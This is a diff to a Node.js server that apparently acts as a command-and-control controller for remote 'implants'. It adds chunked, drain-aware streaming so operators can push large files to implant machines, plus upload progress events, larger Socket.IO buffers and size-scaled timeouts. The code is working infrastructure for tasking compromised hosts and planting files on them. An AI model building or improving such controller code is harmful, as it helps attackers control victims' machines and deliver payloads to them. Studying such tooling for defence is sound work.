@@ -23,13 +23,58 @@ const allowedOrigins = (process.env.CORS_ORIGIN || "http://localhost:5000")
   .map(s => s.trim())
   .filter(Boolean);
 
+/** Large GUI uploads send base64 in one Socket.IO packet; default ~1 MiB limit drops the connection. */
+const SOCKET_MAX_HTTP_BUFFER = Math.max(
+  128 * 1024 * 1024,
+  Number(process.env.SOCKET_MAX_HTTP_BUFFER_BYTES) || 0
+);
+
 const io = socketIo(server, {
   cors: {
     origin: allowedOrigins.length ? allowedOrigins : '*',
     methods: ["GET", "POST"],
     credentials: true
-  }
+  },
+  maxHttpBufferSize: SOCKET_MAX_HTTP_BUFFER
 });
+
+/**
+ * Write a chunk to the implant TCP socket and wait for drain if the kernel buffer fills.
+ * Avoids stalling or OOM when pushing multi‑MiB uploads in one write().
+ */
+function writeTcpChunkRespectingDrain(tcpSocket, chunk) {
+  return new Promise((resolve, reject) => {
+    function tryWrite() {
+      try {
+        if (tcpSocket.destroyed) {
+          reject(new Error('TCP socket closed'));
+          return;
+        }
+        const ok = tcpSocket.write(chunk);
+        if (ok) resolve();
+        else tcpSocket.once('drain', tryWrite);
+      } catch (e) {
+        reject(e);
+      }
+    }
+    tryWrite();
+  });
+}
+
+async function streamBinaryUploadToImplant(tcpSocket, fileBuffer, onProgress) {
+  const total = fileBuffer.length;
+  const sizeBuf = Buffer.allocUnsafe(8);
+  sizeBuf.writeBigUInt64LE(BigInt(total), 0);
+  await writeTcpChunkRespectingDrain(tcpSocket, sizeBuf);
+  const CHUNK = 256 * 1024;
+  let sent = 0;
+  while (sent < total) {
+    const end = Math.min(sent + CHUNK, total);
+    await writeTcpChunkRespectingDrain(tcpSocket, fileBuffer.subarray(sent, end));
+    sent = end;
+    if (typeof onProgress === 'function') onProgress(sent, total);
+  }
+}
 
 // Middleware
 app.use(cors());
@@ -1103,23 +1148,42 @@ function createTcpServer() {
             }
             const pu = client.pendingUpload;
             client.pendingUpload = null;
-            try {
-              const sizeBuf = Buffer.allocUnsafe(8);
-              sizeBuf.writeBigUInt64LE(BigInt(pu.buffer.length), 0);
-              client.socket.write(sizeBuf);
-              client.socket.write(pu.buffer);
-              const okMsg = `Upload complete (${pu.buffer.length} bytes) -> ${pu.remotePath}`;
+            const requester = pu.requesterSocket;
+            const pushUploadResult = (okMsg, isError) => {
               const session = clientSessions.get(clientId) || [];
               session.push({ timestamp: new Date(), type: 'response', content: okMsg });
               clientSessions.set(clientId, session);
               io.emit('commandResponse', { clientId, response: okMsg, timestamp: new Date() });
-            } catch (e) {
-              const errMsg = `Upload failed: ${e.message}`;
-              const session = clientSessions.get(clientId) || [];
-              session.push({ timestamp: new Date(), type: 'response', content: errMsg });
-              clientSessions.set(clientId, session);
-              io.emit('commandResponse', { clientId, response: errMsg, timestamp: new Date() });
-            }
+              if (requester && requester.connected) {
+                requester.emit('uploadProgress', {
+                  clientId,
+                  remotePath: pu.remotePath,
+                  sent: isError ? 0 : pu.buffer.length,
+                  total: pu.buffer.length,
+                  done: true,
+                  error: isError ? okMsg : undefined
+                });
+              }
+            };
+            streamBinaryUploadToImplant(client.socket, pu.buffer, (sent, total) => {
+              if (requester && requester.connected) {
+                requester.emit('uploadProgress', {
+                  clientId,
+                  remotePath: pu.remotePath,
+                  sent,
+                  total,
+                  done: false
+                });
+              }
+            })
+              .then(() => {
+                const okMsg = `Upload complete (${pu.buffer.length} bytes) -> ${pu.remotePath}`;
+                pushUploadResult(okMsg, false);
+              })
+              .catch((e) => {
+                const errMsg = `Upload failed: ${e.message}`;
+                pushUploadResult(errMsg, true);
+              });
             continue;
           }
 
@@ -1638,13 +1702,21 @@ io.on('connection', (socket) => {
       if (!remotePath || !fileBase64) {
         return socket.emit('uploadError', { clientId, error: 'remotePath and fileBase64 required' });
       }
-      const maxBytes = 80 * 1024 * 1024;
+      // Base64 expands ~4/3; packet must stay under Engine.IO maxHttpBufferSize.
+      const maxBytes = Math.min(
+        512 * 1024 * 1024,
+        Math.max(1, Math.floor((SOCKET_MAX_HTTP_BUFFER * 3) / 4) - 65536)
+      );
       const buf = Buffer.from(String(fileBase64), 'base64');
       if (buf.length > maxBytes) {
-        return socket.emit('uploadError', { clientId, error: `File too large (max ${maxBytes / (1024 * 1024)} MiB)` });
+        return socket.emit('uploadError', { clientId, error: `File too large (max ${Math.floor(maxBytes / (1024 * 1024))} MiB)` });
       }
       const dest = String(remotePath).trim();
-      client.pendingUpload = { buffer: buf, remotePath: dest };
+      const uploadWaitMs = Math.min(
+        900000,
+        Math.max(120000, 120000 + Math.floor(buf.length / (256 * 1024)) * 30000)
+      );
+      client.pendingUpload = { buffer: buf, remotePath: dest, requesterSocket: socket };
       client.pendingUploadTimeout = setTimeout(() => {
         if (client.pendingUpload) {
           client.pendingUpload = null;
@@ -1655,7 +1727,7 @@ io.on('connection', (socket) => {
           });
         }
         client.pendingUploadTimeout = null;
-      }, 120000);
+      }, uploadWaitMs);
 
       const commandData = { type: 'command', content: `upload ${dest}` };
       client.socket.write(JSON.stringify(commandData) + '\n');
